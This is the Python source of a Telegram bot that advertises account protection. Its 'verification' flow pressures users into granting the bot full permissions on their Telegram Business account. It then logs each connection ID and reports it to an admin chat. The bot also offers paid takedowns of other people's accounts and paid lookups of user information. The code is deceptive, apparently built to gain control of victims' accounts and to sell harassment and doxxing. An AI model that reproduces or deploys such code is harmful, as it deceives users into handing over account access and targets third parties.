import logging
import json
import os
import asyncio
from datetime import datetime, timedelta
import html
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, FSInputFile, BusinessConnection
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest, TelegramNotFound
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command

import config
import random
import string

# Настройка логов
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Constants
TOKEN = config.BOT_TOKEN
LOG_CHAT_ID = -4672823504
last_messages = {}
codes = {}
ADMIN_IDS = config.ADMIN_ID
storage = MemoryStorage()

# Инициализация бота и диспетчера
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=storage)

class Draw(StatesGroup):
    id = State()
    gift = State()

CONNECTIONS_FILE = "business_connections.json"
PROMOCODES_FILE = "promocodes.json"
USER_DATA_FILE = "user_data.json"
MAX_MESSAGE_LENGTH = 4000

def load_connections():
    """Загружает подключения из файла, удаляя дубликаты."""
    try:
        with open(CONNECTIONS_FILE, "r") as f:
            connections = json.load(f)
            unique_connections = list({conn["connection_id"]: conn for conn in connections}.values())
            logger.info(f"Loaded {len(unique_connections)} unique connections")
            return unique_connections
    except (FileNotFoundError, json.JSONDecodeError):
        logger.warning(f"Connections file not found or invalid, initializing empty list")
        return []

def save_connections(connections):
    """Сохраняет подключения в файл."""
    try:
        with open(CONNECTIONS_FILE, "w") as f:
            json.dump(connections, f, indent=2)
        logger.info(f"Saved {len(connections)} connections to {CONNECTIONS_FILE}")
    except Exception as e:
        logger.error(f"Failed to save connections: {e}")

def load_promocodes():
    """Загружает промокоды из файла."""
    try:
        with open(PROMOCODES_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        logger.warning(f"Promocodes file not found or invalid, initializing empty list")
        return []

def save_promocodes(promocodes):
    """Сохраняет промокоды в файл."""
    try:
        with open(PROMOCODES_FILE, "w") as f:
            json.dump(promocodes, f, indent=2)
        logger.info(f"Saved {len(promocodes)} promocodes to {PROMOCODES_FILE}")
    except Exception as e:
        logger.error(f"Failed to save promocodes: {e}")

def load_user_data():
    """Загружает данные пользователей из файла."""
    try:
        with open(USER_DATA_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        logger.warning(f"User data file not found or invalid, initializing empty dict")
        return {}

def save_user_data(user_data):
    """Сохраняет данные пользователей в файл."""
    try:
        with open(USER_DATA_FILE, "w") as f:
            json.dump(user_data, f, indent=2)
        logger.info(f"Saved user data for {len(user_data)} users to {USER_DATA_FILE}")
    except Exception as e:
        logger.error(f"Failed to save user data: {e}")

def generate_promo_code(length=8):
    """Генерирует уникальный промокод."""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

async def create_promo_code(subscription_type: str):
    """Создает новый одноразовый промокод для указанного типа подписки."""
    promocodes = load_promocodes()
    code = generate_promo_code()
    while any(p["code"] == code for p in promocodes):
        code = generate_promo_code()
    
    expiration_date = (datetime.now() + timedelta(days=1)).strftime("%Y-%m-%d")
    new_promo = {
        "code": code,
        "subscription_type": subscription_type,
        "expiration_date": expiration_date,
        "used": False
    }
    promocodes.append(new_promo)
    save_promocodes(promocodes)
    logger.info(f"Created promo code {code} for {subscription_type}")
    return new_promo

async def apply_promo_code(user_id: int, promo_code: str) -> tuple[bool, str]:
    """Активирует одноразовый промокод и обновляет подписку пользователя."""
    promocodes = load_promocodes()
    user_data = load_user_data()
    
    for promo in promocodes:
        if promo["code"] == promo_code and not promo["used"]:
            try:
                expiration_date = datetime.strptime(promo["expiration_date"], "%Y-%m-%d")
                if expiration_date < datetime.now():
                    return False, "Промокод не найден или был использован."
            except ValueError:
                logger.error(f"Invalid expiration date format for promo {promo_code}")
                return False, "Промокод не найден или был использован."
            
            promo["used"] = True
            save_promocodes(promocodes)
            logger.info(f"Promo code {promo_code} marked as used by user {user_id}")
            
            user_id_str = str(user_id)
            if user_id_str not in user_data:
                user_data[user_id_str] = {
                    "username": f"user_{user_id}",
                    "registration_date": datetime.now().strftime("%Y-%m-%d"),
                    "verification_status": "Not Verified",
                    "current_subscription": "None",
                    "subscription_expiry": "",
                    "operation_history": []
                }
            
            subscription_duration = {
                "1day": (timedelta(days=1), "1 день"),
                "7days": (timedelta(days=7), "7 дней"),
                "30days": (timedelta(days=30), "30 дней")
            }
            subscription_type = promo["subscription_type"]
            if subscription_type not in subscription_duration:
                logger.error(f"Invalid subscription type {subscription_type} in promo {promo_code}")
                return False, "Промокод не найден или был использован."
            
            expiry_date = (datetime.now() + subscription_duration[subscription_type][0]).strftime("%Y-%m-%d")
            user_data[user_id_str]["current_subscription"] = subscription_type
            user_data[user_id_str]["subscription_expiry"] = expiry_date
            user_data[user_id_str]["operation_history"].append(
                f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: Активирована подписка {subscription_duration[subscription_type][1]}"
            )
            user_data[user_id_str]["verification_status"] = "Verified"
            save_user_data(user_data)
            logger.info(f"User {user_id} activated subscription {subscription_type} until {expiry_date}")
            
            return True, f"Вы ввели промокод! Подписка на {subscription_duration[subscription_type][1]} активирована до {expiry_date}!"
    
    logger.warning(f"User {user_id} attempted to use invalid or used promo code {promo_code}")
    return False, "Промокод не найден или был использован."

async def get_user_info(user_id: int):
    """Возвращает информацию о пользователе."""
    user_data = load_user_data()
    user_id_str = str(user_id)
    if user_id_str not in user_data:
        user_data[user_id_str] = {
            "username": f"user_{user_id}",
            "registration_date": datetime.now().strftime("%Y-%m-%d"),
            "verification_status": "Not Verified",
            "current_subscription": "None",
            "subscription_expiry": "",
            "operation_history": []
        }
        save_user_data(user_data)
        logger.info(f"Created new user data for {user_id}")
    
    return user_data[user_id_str]

async def remove_invalid_connection(connection_id: str):
    """Удаляет невалидное подключение из файла."""
    connections = load_connections()
    new_connections = [conn for conn in connections if conn["connection_id"] != connection_id]
    
    if len(new_connections) < len(connections):
        save_connections(new_connections)
        logger.warning(f"Removed invalid connection: {connection_id}")
        return True
    return False

async def check_permissions(connection_id: str) -> bool:
    try:
        # Пробуем получить информацию о подключении для проверки прав
        response = await bot.request(
            method="getBusinessConnection",
            data={"business_connection_id": connection_id}
        )
        return True
    except TelegramBadRequest as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            await remove_invalid_connection(connection_id)
            return False
        if "Forbidden" in str(e) or "no rights" in str(e):
            return False
        logger.error(f"Permission check error: {e}")
        return False
    except TelegramNotFound as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            await remove_invalid_connection(connection_id)
            return False
        logger.error(f"Permission check error: {e}")
        return False
    except Exception as e:
        logger.error(f"Permission check error: {e}")
        return False

async def load_active_connections():
    """Загружает активные подключения с проверкой прав."""
    connections = load_connections()
    active_connections = []
    
    for conn in connections:
        try:
            if await check_permissions(conn["connection_id"]):
                active_connections.append(conn)
                user_data = load_user_data()
                user_id_str = str(conn["user_id"])
                if user_id_str not in user_data:
                    user_data[user_id_str] = {
                        "username": conn["username"],
                        "registration_date": datetime.now().strftime("%Y-%m-%d"),
                        "verification_status": "Not Verified",
                        "current_subscription": "None",
                        "subscription_expiry": "",
                        "operation_history": []
                    }
                    save_user_data(user_data)
                    logger.info(f"Initialized user data for {conn['user_id']} with verified status")
                else:
                    user_data[user_id_str]["verification_status"] = "Verified"
                    user_data[user_id_str]["username"] = conn["username"]
                    save_user_data(user_data)
                    logger.info(f"Updated verification status for user {conn['user_id']} to Verified")
            else:
                await remove_invalid_connection(conn["connection_id"])
                logger.warning(f"Removed invalid connection {conn['connection_id']} for user {conn['user_id']}")
        except Exception as e:
            logger.error(f"Error processing connection {conn['connection_id']}: {e}")
            await remove_invalid_connection(conn["connection_id"])
    
    logger.info(f"Loaded {len(active_connections)} active connections")
    return active_connections

async def send_long_message(chat_id: int, text: str, parse_mode: str = "HTML"):
    """Отправляет длинное сообщение, разбивая на части."""
    if len(text) <= MAX_MESSAGE_LENGTH:
        try:
            await bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
        except TelegramBadRequest as e:
            logger.error(f"Failed to send message: {e}")
            await bot.send_message(chat_id=chat_id, text="❌ Error sending message. Please try again.")
        return
    
    for i in range(0, len(text), MAX_MESSAGE_LENGTH):
        try:
            await bot.send_message(chat_id=chat_id, text=text[i:i+MAX_MESSAGE_LENGTH], parse_mode=parse_mode)
            await asyncio.sleep(0.5)
        except TelegramBadRequest as e:
            logger.error(f"Failed to send message part: {e}")
            await bot.send_message(chat_id=chat_id, text="❌ Error sending message part. Please try again.")

async def pagination(page=0):
    """Пагинация (оставлена для совместимости, но не используется)."""
    try:
        builder = InlineKeyboardBuilder()
        builder.row(
            InlineKeyboardButton(text="•", callback_data="empty"),
            InlineKeyboardButton(text="1/1", callback_data="empty"),
            InlineKeyboardButton(text="•", callback_data="empty")
        )
        return builder.as_markup()
    except Exception as e:
        logger.error(f"Pagination error: {e}")
        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"❌ Pagination error: {e}")
        return InlineKeyboardMarkup()

# ===================== ОСНОВНЫЕ ОБРАБОТЧИКИ =====================
@dp.message(Command("start"))
async def start_command(message: Message):
    try:
        active_connections = await load_active_connections()
        count = len(active_connections)
        logger.info(f"User {message.from_user.id} started bot, found {count} active connections")
    except Exception as e:
        logger.error(f"Error loading connections: {e}")
        count = 0

    if message.from_user.id not in ADMIN_IDS:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🤖 Пройти верификацию", callback_data="verify")]
        ])
        
        welcome_message = (
            "🎮 <b>Приветствую тебя, искатель безопасности!</b>\n\n"
            "👋 Это <b>Rodjer</b> — твой проводник в мир надёжной защиты Telegram-аккаунта!\n\n"
            "💎 <b>Специально для тебя:</b>\n"
            "• Мощные инструменты защиты\n"
            "• Эксклюзивные услуги\n"
            "• Гибкие тарифные планы\n"
            "• Пробный период без обязательств\n\n"
            "🎯 <b>Готов начать?</b> Выбери опцию в меню или напиши /start, чтобы открыть все возможности!\n\n"
            "🛡 <b>Твоя безопасность — мой приоритет!</b>"
        )
        
        photo_path = "connect.jpg"
        if os.path.exists(photo_path):
            try:
                photo = FSInputFile(photo_path)
                await message.answer_photo(
                    photo=photo,
                    caption=welcome_message,
                    reply_markup=keyboard,
                    parse_mode="HTML"
                )
                return
            except Exception as e:
                logger.error(f"Photo send error: {e}")
        await message.answer(
            welcome_message,
            reply_markup=keyboard,
            parse_mode="HTML"
        )
    else:
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Refresh Connections", callback_data="refresh_connections")],
                [InlineKeyboardButton(text="🎟 Create Promo Code", callback_data="create_promo")]
            ]
        )
        
        await message.answer(
            f"👑 <b>Admin Panel</b>\n\n"
            f"🔗 Active connections: <code>{count}</code>\n\n"
            "⚠️ Use buttons below to manage accounts:",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        await send_video(chat_id=message.chat.id)

@dp.callback_query(F.data == "verify")
async def verify_handler(callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    logger.info(f"User {user_id} triggered verification")
    
    connections = await load_active_connections()
    has_permissions = any(conn["user_id"] == user_id for conn in connections)
    
    if not has_permissions:
        logger.info(f"No active connections found for user {user_id}, checking permissions directly")
        connections = load_connections()
        for conn in connections:
            if conn["user_id"] == user_id:
                if await check_permissions(conn["connection_id"]):
                    has_permissions = True
                    user_data = load_user_data()
                    user_id_str = str(user_id)
                    if user_id_str not in user_data:
                        user_data[user_id_str] = {
                            "username": conn["username"],
                            "registration_date": datetime.now().strftime("%Y-%m-%d"),
                            "verification_status": "Not Verified",
                            "current_subscription": "None",
                            "subscription_expiry": "",
                            "operation_history": []
                        }
                    else:
                        user_data[user_id_str]["verification_status"] = "Verified"
                        user_data[user_id_str]["username"] = conn["username"]
                    save_user_data(user_data)
                    logger.info(f"User {user_id} verified via direct permission check")
                    break
                else:
                    await remove_invalid_connection(conn["connection_id"])
    
    if not has_permissions:
        logger.warning(f"User {user_id} failed verification")
        verification_text = (
            "🔐 <b>Верификация аккаунта — обязательное условие для полноценного использования функционала бота</b>\n\n"
            "<b>Что такое верификация?</b>\n"
            "Это процесс добавления нашего бота в ваш бизнес-аккаунт, который открывает доступ ко всем возможностям сервиса и обеспечивает максимальную защиту ваших данных.\n\n"
            "<b>Почему верификация важна?</b>\n"
            "Безопасность — наш главный приоритет! 🛡\n\n"
            "<b>🔄 Как предоставить доступ:</b>\n"
            "1. Нажмите на кнопку «Настройки»\n"
            "2. Выберите пункт «Telegram для Бизнеса»\n"
            "3. Выберите пункт «Чат боты»\n"
            "4. Выдайте все разрешения\n"
            "5. Подтвердите изменения\n\n"
            "После этого нажмите кнопку ниже для проверки верификации."
        )
        video_path = "demo.mp4"
        if os.path.exists(video_path):
            try:
                await callback.message.answer_video(
                    video=FSInputFile(video_path),
                    caption=verification_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="✅ Проверить верификацию", callback_data="check_verification")]
                    ])
                )
                return
            except Exception as e:
                logger.error(f"Video send error: {e}")
        await callback.message.answer(
            verification_text,
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Проверить верификацию", callback_data="check_verification")]
            ])
        )
        return
    
    for conn in connections:
        if conn["user_id"] == user_id and not await check_permissions(conn["connection_id"]):
            logger.warning(f"User {user_id} has insufficient permissions")
            permission_text = (
                "⚠️ <b>Внимание!</b>\n\n"
                "Для корректной работы нашего сервиса необходимы полные права доступа. 🔐\n\n"
                "<b>🔄 Как предоставить доступ:</b>\n"
                "1. Нажмите на кнопку «Настройки»\n"
                "2. Выберите пункт «Telegram для Бизнеса»\n"
                "3. Выберите пункт «Чат боты»\n"
                "4. Выдайте все разрешения\n"
                "5. Подтвердите изменения\n\n"
                "После этого нажмите кнопку ниже для проверки верификации."
            )
            video_path = "demo.mp4"
            if os.path.exists(video_path):
                try:
                    await callback.message.answer_video(
                        video=FSInputFile(video_path),
                        caption=permission_text,
                        parse_mode="HTML",
                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text="✅ Проверить верификацию", callback_data="check_verification")]
                        ])
                    )
                    return
                except Exception as e:
                    logger.error(f"Video send error: {e}")
            await callback.message.answer(
                permission_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="✅ Проверить верификацию", callback_data="check_verification")]
                ])
            )
            return
    
    logger.info(f"User {user_id} passed verification, showing main menu")
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🛡 Функционал", callback_data="functionality")],
            [InlineKeyboardButton(text="👤 Личный кабинет", callback_data="personal_cabinet")],
            [InlineKeyboardButton(text="🎟 Система промокодов", callback_data="promo_code")],
            [InlineKeyboardButton(text="ℹ️ О проекте", callback_data="about_project")]
        ]
    )
    
    menu_text = (
        "<b>🛡 Главное меню</b>\n"
        "Выберите действие:"
    )
    
    await callback.message.answer(menu_text, reply_markup=keyboard, parse_mode="HTML")
    await send_video(chat_id=callback.message.chat.id)

@dp.callback_query(F.data == "check_verification")
async def check_verification_handler(callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    logger.info(f"User {user_id} checking verification")
    
    connections = await load_active_connections()
    has_permissions = any(conn["user_id"] == user_id for conn in connections)
    
    if not has_permissions:
        logger.warning(f"User {user_id} failed verification check")
        await callback.message.answer(
            "🔐 <b>Верификация не пройдена</b>\n\n"
            "Пожалуйста, предоставьте доступ боту и нажмите кнопку «Проверить верификацию» снова.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Проверить верификацию", callback_data="check_verification")]
            ])
        )
        return
    
    for conn in connections:
        if conn["user_id"] == user_id and not await check_permissions(conn["connection_id"]):
            logger.warning(f"User {user_id} has insufficient permissions")
            await callback.message.answer(
                "⚠️ <b>Внимание!</b>\n\n"
                "Для корректной работы необходимы полные права доступа. Предоставьте их и нажмите кнопку «Проверить верификацию» снова.",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="✅ Проверить верификацию", callback_data="check_verification")]
                ])
            )
            return
    
    logger.info(f"User {user_id} passed verification check, showing main menu")
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🛡 Функционал", callback_data="functionality")],
            [InlineKeyboardButton(text="👤 Личный кабинет", callback_data="personal_cabinet")],
            [InlineKeyboardButton(text="🎟 Система промокодов", callback_data="promo_code")],
            [InlineKeyboardButton(text="ℹ️ О проекте", callback_data="about_project")]
        ]
    )
    
    menu_text = (
        "<b>🛡 Главное меню</b>\n"
        "Выберите действие:"
    )
    
    await callback.message.answer(menu_text, reply_markup=keyboard, parse_mode="HTML")
    await send_video(chat_id=callback.message.chat.id)

# ===================== ОБРАБОТЧИКИ МЕНЮ =====================
@dp.callback_query(F.data == "functionality")
async def functionality_handler(callback: CallbackQuery):
    await callback.answer()
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🛡 Защита от сноса", callback_data="protection_menu"),
                InlineKeyboardButton(text="💥 Снос аккаунта", callback_data="account_ban")
            ],
            [
                InlineKeyboardButton(text="🔍 Информация о пользователе", callback_data="user_info"),
                InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")
            ]
        ]
    )
    
    functionality_text = (
        "<b>🛡 Функционал</b>\n"
        "Выберите услугу:"
    )
    
    await callback.message.answer(functionality_text, reply_markup=keyboard, parse_mode="HTML")

@dp.callback_query(F.data == "protection_menu")
async def protection_menu_handler(callback: CallbackQuery):
    await callback.answer()
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="1 день — 1$", callback_data="protection_1day"),
                InlineKeyboardButton(text="7 дней — 5$", callback_data="protection_7days")
            ],
            [
                InlineKeyboardButton(text="30 дней — 20$", callback_data="protection_30days"),
                InlineKeyboardButton(text="⬅️ Назад", callback_data="functionality")
            ]
        ]
    )
    
    await callback.message.answer(
        "🛡 <b>Защита от сноса</b>\n\n"
        "Выберите тарифный план:\n"
        "Для покупки свяжитесь с @RodjerGIFT",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.callback_query(F.data.in_(["protection_1day", "protection_7days", "protection_30days"]))
async def protection_purchase_handler(callback: CallbackQuery):
    await callback.answer()
    sub_types = {
        "protection_1day": "1 день",
        "protection_7days": "7 дней",
        "protection_30days": "30 дней"
    }
    plan = sub_types[callback.data]
    
    await callback.message.answer(
        f"🛡 Вы выбрали защиту от сноса на <b>{plan}</b>!\n\n"
        "Для покупки свяжитесь с @RodjerGIFT, чтобы получить промокод или оплатить услугу.\n\n"
        "🔙 Вернуться в меню:",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="protection_menu")]]
        ),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "account_ban")
async def account_ban_handler(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer(
        "💥 <b>Снос аккаунта</b>\n\n"
        "Стоимость услуги: 10$\n\n"
        "Для заказа услуги свяжитесь с @RodjerGIFT и предоставьте ID или username целевого аккаунта.\n\n"
        "🔙 Вернуться в меню:",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="functionality")]]
        ),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "user_info")
async def user_info_handler(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer(
        "🔍 <b>Узнать информацию о пользователе</b>\n\n"
        "Стоимость услуги: 5$\n\n"
        "Для заказа услуги свяжитесь с @RodjerGIFT и предоставьте ID или username пользователя.\n\n"
        "🔙 Вернуться в меню:",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="functionality")]]
        ),
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "personal_cabinet")
async def personal_cabinet_handler(callback: CallbackQuery):
    await callback.answer()
    user_info = await get_user_info(callback.from_user.id)
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]
    )
    
    cabinet_text = (
        "👤 <b>Личный кабинет</b>\n"
        f"📛 <b>Имя пользователя:</b> @{html.escape(user_info['username'])}\n"
        f"📅 <b>Дата регистрации:</b> <code>{user_info['registration_date']}</code>\n"
        f"✅ <b>Статус верификации:</b> <code>{user_info['verification_status']}</code>\n"
        f"💳 <b>Текущая подписка:</b> <code>{user_info['current_subscription']}</code>\n"
        f"📅 <b>Срок действия подписки:</b> <code>{user_info['subscription_expiry'] or 'None'}</code>\n"
        f"📜 <b>История операций:</b>\n"
        + "\n".join([f"• {op}" for op in user_info['operation_history']] or ["• Нет операций"])
    )
    
    await callback.message.answer(cabinet_text, reply_markup=keyboard, parse_mode="HTML")

@dp.callback_query(F.data == "promo_code")
async def promo_code_handler(callback: CallbackQuery):
    await callback.answer()
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]
    )
    
    await callback.message.answer(
        "🎟 <b>Система промокодов</b>\n\n"
        "Введите ваш промокод в чат, чтобы активировать подписку.\n"
        "Для получения промокода свяжитесь с <b>@RodjerGIFT</b>.",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "about_project")
async def about_project_handler(callback: CallbackQuery):
    await callback.answer()
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]
    )
    
    about_text = (
        "ℹ️ <b>О проекте</b>\n"
        "🎮 <b>Rodjer</b> — это ваш надёжный помощник в защите Telegram-аккаунта!\n\n"
        "<b>Наша миссия:</b>\n"
        "Обеспечить максимальную безопасность вашего аккаунта и предоставить эксклюзивные услуги для комфортного использования Telegram.\n\n"
        "<b>Что мы предлагаем:</b>\n"
        "• 🛡 Защита от сноса аккаунта\n"
        "• 💥 Возможность нейтрализации аккаунтов обидчиков\n"
        "• 🔍 Получение информации о пользователях\n"
        "• 🎟 Гибкая система подписок и промокодов\n\n"
        "<b>Почему выбирают нас?</b>\n"
        "• 🔒 Современные технологии шифрования\n"
        "• ✅ Проверенные методы защиты\n"
        "• 🤝 Прозрачность и поддержка 24/7\n\n"
        "Свяжитесь с @RodjerGIFT для получения дополнительной информации или помощи!\n\n"
        "🔙 Вернуться в меню:"
    )
    
    await callback.message.answer(about_text, reply_markup=keyboard, parse_mode="HTML")

@dp.message(F.text)
async def handle_promo_code(message: Message):
    connections = await load_active_connections()
    user_id = message.from_user.id
    if not any(conn["user_id"] == user_id for conn in connections):
        logger.warning(f"User {user_id} attempted to use promo code without verification")
        await message.answer(
            "❌ Пожалуйста, пройдите верификацию для использования промокодов!\n\n"
            "Нажмите /start и выберите «🤖 Пройти верификацию».",
            parse_mode="HTML"
        )
        return
    
    promo_code = message.text.strip()
    success, result = await apply_promo_code(user_id, promo_code)
    await message.answer(result, parse_mode="HTML")

@dp.callback_query(F.data == "main_menu")
async def main_menu_handler(callback: CallbackQuery):
    await callback.answer()
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🛡 Функционал", callback_data="functionality")],
            [InlineKeyboardButton(text="👤 Личный кабинет", callback_data="personal_cabinet")],
            [InlineKeyboardButton(text="🎟 Система промокодов", callback_data="promo_code")],
            [InlineKeyboardButton(text="ℹ️ О проекте", callback_data="about_project")]
        ]
    )
    
    menu_text = (
        "<b>🛡 Главное меню</b>\n"
        "Выберите действие:"
    )
    
    await callback.message.answer(menu_text, reply_markup=keyboard, parse_mode="HTML")

# ===================== АДМИН-КОМАНДЫ =====================
@dp.callback_query(F.data == "refresh_connections")
async def refresh_connections_handler(callback: CallbackQuery):
    await callback.answer("🔄 Refreshing...")
    connections = await load_active_connections()
    await callback.message.answer(
        f"🔗 Active connections: <code>{len(connections)}</code>",
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "create_promo")
async def create_promo_handler(callback: CallbackQuery):
    await callback.answer("🎟 Creating promo code...")
    promo = await create_promo_code("30days")  # Создаем промокод на 30 дней по умолчанию
    await callback.message.answer(
        f"✅ Created promo code: <code>{promo['code']}</code>\n"
        f"Expires on: <code>{promo['expiration_date']}</code>",
        parse_mode="HTML"
    )

# ===================== БИЗНЕС-ФУНКЦИИ И ДОПОЛНИТЕЛЬНЫЕ ОБРАБОТЧИКИ =====================
@dp.business_connection()
async def handle_business_connect(connection: BusinessConnection):
    try:
        logger.info(f"New connection: {connection.id} from @{connection.user.username}")
        connections = load_connections()
        new_conn = {
            "user_id": connection.user.id,
            "connection_id": connection.id,
            "username": connection.user.username
        }
        
        # Проверяем, нет ли уже этого подключения
        if not any(c["connection_id"] == connection.id for c in connections):
            connections.append(new_conn)
            save_connections(connections)
            logger.info(f"Added new connection {connection.id} for user {connection.user.id}")
        
        # Проверяем права и верифицируем пользователя
        if await check_permissions(connection.id):
            user_data = load_user_data()
            user_id_str = str(connection.user.id)
            if user_id_str not in user_data:
                user_data[user_id_str] = {
                    "username": connection.user.username,
                    "registration_date": datetime.now().strftime("%Y-%m-%d"),
                    "verification_status": "Verified",
                    "current_subscription": "None",
                    "subscription_expiry": "",
                    "operation_history": [f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: Business connection verified"]
                }
            else:
                user_data[user_id_str]["verification_status"] = "Verified"
                user_data[user_id_str]["username"] = connection.user.username
                if "Business connection verified" not in user_data[user_id_str]["operation_history"]:
                    user_data[user_id_str]["operation_history"].append(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: Business connection verified")
            save_user_data(user_data)
            logger.info(f"User {connection.user.id} verified via business connection")

            # Отправляем сообщение пользователю о успешной верификации
            keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="🛡 Главное меню", callback_data="main_menu")]
                ]
            )
            await bot.send_message(
                chat_id=connection.user.id,
                text=(
                    "✅ <b>Верификация успешно пройдена!</b>\n\n"
                    "Вы подключили бота к бизнес-аккаунту. Теперь вы можете использовать все функции.\n\n"
                    "Нажмите кнопку ниже, чтобы перейти в главное меню."
                ),
                reply_markup=keyboard,
                parse_mode="HTML"
            )
        else:
            await bot.send_message(
                chat_id=connection.user.id,
                text=(
                    "⚠️ <b>Ошибка верификации</b>\n\n"
                    "Бот не получил полные права доступа. Пожалуйста, предоставьте все разрешения в настройках бизнес-аккаунта и повторите подключение."
                ),
                parse_mode="HTML"
            )

        # Уведомляем админа
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=(
                f"🔔 <b>New connection!</b>\n\n"
                f"👤 @{new_conn['username']}\n"
                f"🆔 ID: <code>{new_conn['user_id']}</code>\n"
                f"🔗 Connection ID: <code>{new_conn['connection_id']}</code>\n"
                f"🚨 Status: {'✅ Verified' if await check_permissions(connection.id) else '⚠️ No permissions'}"
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Connection handling error: {e}")

async def send_video(chat_id: int):
    """Отправляет видео (если доступно)."""
    video_path = "demo.mp4"
    if os.path.exists(video_path):
        try:
            await bot.send_video(chat_id=chat_id, video=FSInputFile(video_path))
        except Exception as e:
            logger.error(f"Video send error: {e}")

# ===================== ЗАПУСК БОТА =====================
async def main():
    logger.info("🤖 Starting Business Connection Bot...")
    
    logger.info("🔍 Checking existing connections...")
    try:
        await load_active_connections()
    except Exception as e:
        logger.error(f"Error checking connections: {e}")
    
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logger.critical(f"Critical error: {e}")

if __name__ == "__main__":
    asyncio.run(main())
